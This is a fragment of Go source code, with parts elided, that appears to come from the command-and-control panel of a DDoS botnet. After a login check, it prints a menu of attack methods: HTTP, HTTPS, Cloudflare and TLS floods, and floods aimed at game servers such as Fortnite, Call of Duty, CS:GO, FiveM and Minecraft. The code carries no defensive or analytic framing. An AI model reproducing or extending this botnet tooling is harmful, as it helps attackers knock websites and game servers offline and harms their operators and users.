  ...
  if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
    ...
    go func() {
        ...
        if cmd == "methods" {
            ...
            this.conn.Write([]byte("\033[1;91mhttp\033[37m: HTTP Flood. (LAYER 7)\r\n"))
            this.conn.Write([]byte("\033[1;91mhttps\033[37m: HTTPS Flood. (LAYER 7)\r\n"))
            this.conn.Write([]byte("\033[1;91mcloudflare\033[37m: CF flood. (LAYER 7)\r\n"))
            this.conn.Write([]byte("\033[1;91mtls\033[37m: tls flood. (LAYER 7)\r\n"))
            this.conn.Write([]byte("\033[1;91mfortnite\033[37m: Fortnite Game flood. (GAME)\r\n"))
            this.conn.Write([]byte("\033[1;91mbo6\033[37m: bo6 game flood. (GAME)\r\n"))
            this.conn.Write([]byte("\033[1;91mcod\033[37m: cod game flood. (GAME)\r\n"))
            this.conn.Write([]byte("\033[1;91mrleague\033[37m: Rocket League flood. (GAME)\r\n"))
            this.conn.Write([]byte("\033[1;91mcsgo\033[37m: csgo flood. (GAME)\r\n"))
            this.conn.Write([]byte("\033[1;91mfivem\033[37m: fivem servers flood with all tcp flags. (GAME)\r\n"))
            this.conn.Write([]byte("\033[1;91mminecraft\033[37m: minecraft flood. (GAME)\r\n"))
            continue
        } 
